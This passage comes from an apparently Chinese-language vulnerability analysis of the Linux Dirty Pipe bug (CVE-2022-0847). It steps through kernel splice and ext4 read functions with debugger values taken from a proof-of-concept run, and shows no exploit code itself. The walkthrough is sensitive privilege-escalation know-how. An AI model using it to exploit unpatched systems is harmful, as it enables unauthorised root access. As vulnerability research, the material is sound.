class="line"></span><br><span class="line"><span class="keyword">if</span> (__off_out &amp;&amp; <span class="built_in">copy_to_user</span>(off_out, __off_out, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">loff_t</span>)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (__off_in &amp;&amp; <span class="built_in">copy_to_user</span>(off_in, __off_in, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">loff_t</span>)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3、do-splice"><a href="#3、do-splice" class="headerlink" title="3、do_splice"></a>3、do_splice</h4><p>这里对数据进行了进一步处理，判断了<code>in</code>，<code>off_in</code>，<code>out</code>，<code>off_out</code></p><p>这里分三种情况，<code>in</code>和<code>out</code>都有<code>pipe</code>时，调用<code>splice_pipe_to_pipe</code>；<code>in</code>为<code>pipe</code>时调用<code>do_splice_from</code>，<code>out</code>为<code>pipe</code>时调用<code>do_splice_to</code>。这俩单个的也涉及<code>offset</code>的用户空间和内核空间复制的问题。</p><p>由于我们poc中的<code>splice</code>系统调用是从文件写入管道，所以我们在实时调试中调用的是<code>do_splice_to</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine where to splice to/from.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">do_splice</span><span class="params">(struct file *in, <span class="keyword">loff_t</span> *off_in, struct file *out,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">loff_t</span> *off_out, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">ipipe</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">opipe</span>;</span></span><br><span class="line"><span class="keyword">loff_t</span> offset;</span><br><span class="line"><span class="keyword">long</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(!(in-&gt;f_mode &amp; FMODE_READ) ||</span><br><span class="line">     !(out-&gt;f_mode &amp; FMODE_WRITE)))</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">ipipe = <span class="built_in">get_pipe_info</span>(in, <span class="literal">true</span>);<span class="comment">// 函数返回0x0</span></span><br><span class="line">opipe = <span class="built_in">get_pipe_info</span>(out, <span class="literal">true</span>);<span class="comment">// 函数返回正常，所以接下来跳转到了 66 行，奇怪的是，上面的 __do_splice 也有相同的操作。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ipipe &amp;&amp; opipe) &#123;</span><br><span class="line"><span class="keyword">if</span> (off_in || off_out)</span><br><span class="line"><span class="keyword">return</span> -ESPIPE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Splicing to self would be fun, but... */</span></span><br><span class="line"><span class="keyword">if</span> (ipipe == opipe)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((in-&gt;f_flags | out-&gt;f_flags) &amp; O_NONBLOCK)</span><br><span class="line">flags |= SPLICE_F_NONBLOCK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">splice_pipe_to_pipe</span>(ipipe, opipe, len, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ipipe) &#123;</span><br><span class="line"><span class="keyword">if</span> (off_in)</span><br><span class="line"><span class="keyword">return</span> -ESPIPE;</span><br><span class="line"><span class="keyword">if</span> (off_out) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(out-&gt;f_mode &amp; FMODE_PWRITE))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">offset = *off_out;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">offset = out-&gt;f_pos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(out-&gt;f_flags &amp; O_APPEND))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">ret = <span class="built_in">rw_verify_area</span>(WRITE, out, &amp;offset, len);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(ret &lt; <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in-&gt;f_flags &amp; O_NONBLOCK)</span><br><span class="line">flags |= SPLICE_F_NONBLOCK;</span><br><span class="line"></span><br><span class="line"><span class="built_in">file_start_write</span>(out);</span><br><span class="line">ret = <span class="built_in">do_splice_from</span>(ipipe, out, &amp;offset, len, flags);</span><br><span class="line"><span class="built_in">file_end_write</span>(out);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!off_out)</span><br><span class="line">out-&gt;f_pos = offset;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">*off_out = offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (opipe) &#123;</span><br><span class="line"><span class="keyword">if</span> (off_out)<span class="comment">// off_out == 0x0</span></span><br><span class="line"><span class="keyword">return</span> -ESPIPE;</span><br><span class="line"><span class="keyword">if</span> (off_in) &#123; <span class="comment">// *off_in == 0x3</span></span><br><span class="line"><span class="keyword">if</span> (!(in-&gt;f_mode &amp; FMODE_PREAD))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">offset = *off_in;<span class="comment">// offset = 0x3</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">offset = in-&gt;f_pos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (out-&gt;f_flags &amp; O_NONBLOCK)<span class="comment">// out-&gt;f_flags == 0x1 #define O_NONBLOCK00004000没进入该if</span></span><br><span class="line">flags |= SPLICE_F_NONBLOCK;</span><br><span class="line"></span><br><span class="line"><span class="built_in">pipe_lock</span>(opipe);<span class="comment">// 加锁处理，证明这里要进行管道写作了，管道的写入一定具有原子性</span></span><br><span class="line">ret = <span class="built_in">wait_for_space</span>(opipe, flags);<span class="comment">// 等到可用缓冲区，也可证明这里是写管道</span></span><br><span class="line"><span class="keyword">if</span> (!ret) &#123;<span class="comment">// ret == 0x0</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_space;</span><br><span class="line"><span class="comment">// 这里确保了写入的内容小于可用缓冲区大小</span></span><br><span class="line"><span class="comment">/* Don&#x27;t try to read more the pipe has space for. */</span></span><br><span class="line">p_space = opipe-&gt;max_usage - <span class="built_in">pipe_occupancy</span>(opipe-&gt;head, opipe-&gt;tail);<span class="comment">//p_space == 0x10 opipe-&gt;max_usage == 0x10这里管道头尾值相等且均为0x10，管道为空</span></span><br><span class="line">len = <span class="built_in">min_t</span>(<span class="keyword">size_t</span>, len, p_space &lt;&lt; PAGE_SHIFT);<span class="comment">// len == 0x1</span></span><br><span class="line"></span><br><span class="line">ret = <span class="built_in">do_splice_to</span>(in, &amp;offset, opipe, len, flags);<span class="comment">// 跟进</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">pipe_unlock</span>(opipe);</span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">wakeup_pipe_readers</span>(opipe);</span><br><span class="line"><span class="keyword">if</span> (!off_in)</span><br><span class="line">in-&gt;f_pos = offset;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">*off_in = offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4、do-splice-to"><a href="#4、do-splice-to" class="headerlink" title="4、do_splice_to"></a>4、do_splice_to</h4><p>该函数做了一些验证，之后跟进<code>f_op-&gt;splice_read</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to initiate a splice from a file to a pipe.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 尝试启动从文件到管道的接头。</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_splice_to</span><span class="params">(struct file *in, <span class="keyword">loff_t</span> *ppos,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct pipe_inode_info *pipe, <span class="keyword">size_t</span> len,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(!(in-&gt;f_mode &amp; FMODE_READ)))</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">ret = <span class="built_in">rw_verify_area</span>(READ, in, ppos, len);<span class="comment">// ret == 0，做了某些验证</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(ret &lt; <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(len &gt; MAX_RW_COUNT))</span><br><span class="line">len = MAX_RW_COUNT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(!in-&gt;f_op-&gt;splice_read))</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">warn_unsupported</span>(in, <span class="string">&quot;read&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> in-&gt;f_op-&gt;<span class="built_in">splice_read</span>(in, ppos, pipe, len, flags);<span class="comment">// 跟进</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5、f-op-gt-splice-read"><a href="#5、f-op-gt-splice-read" class="headerlink" title="5、f_op-&gt;splice_read"></a>5、f_op-&gt;splice_read</h4><p>这里的<code>f_op-&gt;splice_read</code>在不同的文件系统中的定义是不一样的</p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220323175727953.png" alt="image-20220323175727953"></p><p>个人调试漏洞的环境为ext4的文件系统，所以查看ext4内的定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">.mmap= ext4_file_mmap,</span><br><span class="line">.mmap_supported_flags = MAP_SYNC,</span><br><span class="line">.open= ext4_file_open,</span><br><span class="line">.release= ext4_release_file,</span><br><span class="line">.fsync= ext4_sync_file,</span><br><span class="line">.get_unmapped_area = thp_get_unmapped_area,</span><br><span class="line">.splice_read= generic_file_splice_read,</span><br><span class="line">.splice_write= iter_file_splice_write,</span><br><span class="line">.fallocate= ext4_fallocate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以实际调用的函数为<code>generic_file_splice_read</code>。</p><h4 id="6、generic-file-splice-read"><a href="#6、generic-file-splice-read" class="headerlink" title="6、generic_file_splice_read"></a>6、generic_file_splice_read</h4><p>将<code>pipe</code>相关的信息与<code>len</code>放入<code>iov_iter</code>结构体实例<code>to</code>中，定义<code>kiocb</code>协助管理I/O。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * generic_file_splice_read - splice data from file to a pipe</span></span><br><span class="line"><span class="comment"> * @in:file to splice from</span></span><br><span class="line"><span class="comment"> * @ppos:position in @in</span></span><br><span class="line"><span class="comment"> * @pipe:pipe to splice to</span></span><br><span class="line"><span class="comment"> * @len:number of bytes to splice</span></span><br><span class="line"><span class="comment"> * @flags:splice modifier flags</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *    Will read pages from given file and fill them into a pipe. Can be</span></span><br><span class="line"><span class="comment"> *    used as long as it has more or less sane -&gt;read_iter().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * generic_file_splice_read - 将数据从文件拼接到管道</span></span><br><span class="line"><span class="comment">  * @in: 要拼接的文件</span></span><br><span class="line"><span class="comment">  * @ppos：@in 中的位置</span></span><br><span class="line"><span class="comment">  * @pipe: 要拼接的管道</span></span><br><span class="line"><span class="comment">  * @len: 要拼接的字节数</span></span><br><span class="line"><span class="comment">  * @flags: 拼接修饰符标志</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * 描述：</span></span><br><span class="line"><span class="comment">  * 将从给定文件中读取页面并将它们填充到管道中。 只要它具有或多或少的 sane -&gt;read_iter() 就可以使用。</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">generic_file_splice_read</span><span class="params">(struct file *in, <span class="keyword">loff_t</span> *ppos,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct pipe_inode_info *pipe, <span class="keyword">size_t</span> len,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span><span class="comment">// in 传入的文件结构体，ppos == 0x3， pipe为传入的管道，len == 0x1，flags == 0x0</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iov_iter</span> <span class="title">to</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kiocb</span> <span class="title">kiocb</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i_head;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="built_in">iov_iter_pipe</span>(&amp;to, READ, pipe, len);<span class="comment">// 使用 pipe 和 len 对  to 进行初始化，将 pipe ,pipe-&gt;head , len 等的值都传入 to 的各个成员中。</span></span><br><span class="line">i_head = to.head;</span><br><span class="line"><span class="built_in">init_sync_kiocb</span>(&amp;kiocb, in);<span class="comment">// 利用 in 对 kiocb 进行的初始化 ，kiocb是Linux内核中协助异步I/O操作的数据类型</span></span><br><span class="line">kiocb.ki_pos = *ppos;</span><br><span class="line">ret = <span class="built_in">call_read_iter</span>(in, &amp;kiocb, &amp;to);<span class="comment">// 跟进</span></span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span>) &#123;</span><br><span class="line">*ppos = kiocb.ki_pos;</span><br><span class="line"><span class="built_in">file_accessed</span>(in);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">to.head = i_head;</span><br><span class="line">to.iov_offset = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">iov_iter_advance</span>(&amp;to, <span class="number">0</span>); <span class="comment">/* to free what was emitted */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * callers of -&gt;splice_read() expect -EAGAIN on</span></span><br><span class="line"><span class="comment"> * &quot;can&#x27;t put anything in there&quot;, rather than -EFAULT.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ret == -EFAULT)</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="7、call-read-iter-amp-f-op-gt-read-iter"><a href="#7、call-read-iter-amp-f-op-gt-read-iter" class="headerlink" title="7、call_read_iter &amp; f_op-&gt;read_iter"></a>7、call_read_iter &amp; f_op-&gt;read_iter</h4><p>和之前一样，找到ext4文件系统</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">ssize_t</span> <span class="title">call_read_iter</span><span class="params">(struct file *file, struct kiocb *kio,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct iov_iter *iter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> file-&gt;f_op-&gt;<span class="built_in">read_iter</span>(kio, iter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220324145017554.png" alt="image-20220324145017554"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">ext4_file_operations</span> =</span> &#123;</span><br><span class="line">.llseek= ext4_llseek,</span><br><span class="line">.read_iter= ext4_file_read_iter,<span class="comment">// 跟进</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h4 id="8、ext4-file-read-iter"><a href="#8、ext4-file-read-iter" class="headerlink" title="8、ext4_file_read_iter"></a>8、ext4_file_read_iter</h4><p>跟进<code>generic_file_read_iter</code>函数。这里传入的参数分别为<code>kiocb</code>的实例以及<code>iov_iter</code>的实例。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">ext4_file_read_iter</span><span class="params">(struct kiocb *iocb, struct iov_iter *to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> <span class="built_in">file_inode</span>(iocb-&gt;ki_filp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(<span class="built_in">ext4_forced_shutdown</span>(<span class="built_in">EXT4_SB</span>(inode-&gt;i_sb))))</span><br><span class="line"><span class="keyword">return</span> -EIO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">iov_iter_count</span>(to))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* skip atime */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FS_DAX</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IS_DAX</span>(inode))</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">ext4_dax_read_iter</span>(iocb, to);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT)<span class="comment">// iocb-&gt;ki_flags == 0x0</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">ext4_dio_read_iter</span>(iocb, to);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">generic_file_read_iter</span>(iocb, to);<span class="comment">// 跟进，此时 iocb 可以索引到传入的file，to 可以索引到传入的pipe。iocb-&gt;ki_filp 为指向file的指针，to-&gt;count 为splice的长度，to-&gt;pipe 为指向pipe的指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="9、generic-file-read-iter"><a href="#9、generic-file-read-iter" class="headerlink" title="9、generic_file_read_iter"></a>9、generic_file_read_iter</h4><p>没做啥操作，大if跳过去了，跟进<code>generic_file_buffered_read</code>函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下翻译自源码注释</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * generic_file_read_iter - 通用文件系统读取例程</span></span><br><span class="line"><span class="comment">  * @iocb: 内核 I/O 控制块</span></span><br><span class="line"><span class="comment">  * @iter: 读取数据的目的地</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * 这是所有可以直接使用页面缓存的文件系统的“read_iter()”例程。</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * iocb-&gt;ki_flags 中的 IOCB_NOWAIT 标志表示在不等待 I/O 请求完成而无法读取数据时应返回 -EAGAIN； 它不会阻止预读。</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * iocb-&gt;ki_flags 中的 IOCB_NOIO 标志表示不应为读取或预读发出新的 I/O 请求。 当无法读取数据时，应返回-EAGAIN。 当触发预读时，应返回部分的、可能为空的读取。</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * 返回：</span></span><br><span class="line"><span class="comment">  * * 复制的字节数，即使对于部分读取负错误代码（如果 IOCB_NOIO 则为 0）如果没有读取任何内容</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">generic_file_read_iter</span><span class="params">(struct kiocb *iocb, struct iov_iter *iter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> count = <span class="built_in">iov_iter_count</span>(iter);<span class="comment">// count == 0x1，为读取内容的长度，也就是我们传入的参数</span></span><br><span class="line"><span class="keyword">ssize_t</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!count)</span><br><span class="line"><span class="keyword">goto</span> out; <span class="comment">/* skip atime */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT) &#123;<span class="comment">// iocb-&gt;ki_flags == 0x0，所以没进入该if</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span> =</span> file-&gt;f_mapping;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> mapping-&gt;host;</span><br><span class="line"><span class="keyword">loff_t</span> size;</span><br><span class="line"></span><br><span class="line">size = <span 